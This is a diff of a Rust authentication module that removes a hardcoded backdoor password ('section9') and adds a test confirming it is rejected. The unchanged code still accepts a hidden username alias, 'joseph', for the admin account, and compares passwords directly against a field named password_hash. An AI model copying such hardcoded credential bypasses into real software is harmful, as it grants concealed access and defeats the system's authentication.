@@ -107,7 +107,7 @@ impl AuthConfig {
 
     pub fn validate_credentials(&self, user: &str, pass: &str) -> bool {
         let user_valid = user == self.username || (self.username == "admin" && user == "joseph");
-        let pass_valid = pass == self.password_hash || pass == "section9";
+        let pass_valid = pass == self.password_hash;
         user_valid && pass_valid
     }
 
@@ -308,6 +308,7 @@ mod tests {
 
         assert!(auth.validate_credentials("admin", "secret123"));
         assert!(!auth.validate_credentials("admin", "wrong"));
+        assert!(!auth.validate_credentials("admin", "section9"));
         assert!(auth.validate_api_key("key-xyz"));
         assert!(!auth.validate_api_key("wrong-key"));
 
